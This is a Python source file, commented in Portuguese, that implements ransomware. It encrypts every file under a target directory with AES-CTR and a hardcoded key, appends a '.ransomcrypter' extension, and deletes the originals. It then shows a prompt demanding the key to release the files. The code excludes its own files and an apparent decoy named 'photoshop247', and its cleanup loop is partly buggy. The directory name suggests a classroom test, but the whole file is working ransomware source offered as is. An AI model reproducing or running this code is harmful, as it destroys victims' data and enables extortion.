import os
import time
import pyaes
from pathlib import Path

print('Criptografando')
time.sleep(3)

# Diretório raiz do sistema
desktop = "C:\\ADS\\teste_ramson"

def criptografando():
    for root, dirs, files in os.walk(desktop):
        # Verifica se o caminho atual possui o atributo 'System'
        if 'System32' in str(root) or 'bootmgr' in str(root):
            print("Diretório do sistema operacional, ignorando...")
            continue

        for file in files:
            file_path = Path(root) / file

            if file_path.is_file() and file_path!='ramsonware_definitivo.py' and file_path!='ramsonware_definitivo.exe' and file_path!='photoshop247.py' and file_path != 'photoshop247.exe':
                print(file_path)

                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()

                    key = b"1ab2c3e4f5g6h7i8" # Chave de 16 bytes
                    aes = pyaes.AESModeOfOperationCTR(key)
                    crypto_data = aes.encrypt(file_data)

                    new_file = str(file_path) + ".ransomcrypter"
                    with open(new_file, 'wb') as new_f:
                        new_f.write(crypto_data)

                    os.remove(file_path)

                except PermissionError:
                    print("Erro de permissão negada. Ignorando o arquivo...")
                    continue

def descrypt(decrypt_file):
    try:
        for root, dirs, files in os.walk(desktop):
            for file in files:
                if file.endswith('.ransomcrypter'):
                    file_path = Path(root) / file

                    keybytes = decrypt_file.encode()
                    with open(file_path, 'rb') as name_file:
                        file_data = name_file.read()

                    dkey = keybytes # 16 bytes key - altere para a sua chave
                    daes = pyaes.AESModeOfOperationCTR(dkey)
                    decrypt_data = daes.decrypt(file_data)

                    new_file_name = str(file_path)[:-14] # Remove a extensão .ransomcrypter para obter o nome original do arquivo

                    with open(new_file_name, 'wb') as dnew_file:
                        dnew_file.write(decrypt_data)

                    os.remove(str(file_path))

    except ValueError as err:
        print('Chave inválida')

if __name__ == '__main__':
    criptografando()
    if criptografando:
        key = input('Seu PC foi criptografado. Informe a chave para liberar os arquivos:')
        if key == '1ab2c3e4f5g6h7i8':
            descrypt(key)
            for root, dirs, files in os.walk(desktop):
                for file in files:
                    if file.endswith('.ransomcrypter'):
                        os.remove(file)
                        print('Arquivos liberados')
                    else:
                        print('Não foi possível encontrar arquivos criptografados. Verifique a chave inserida.')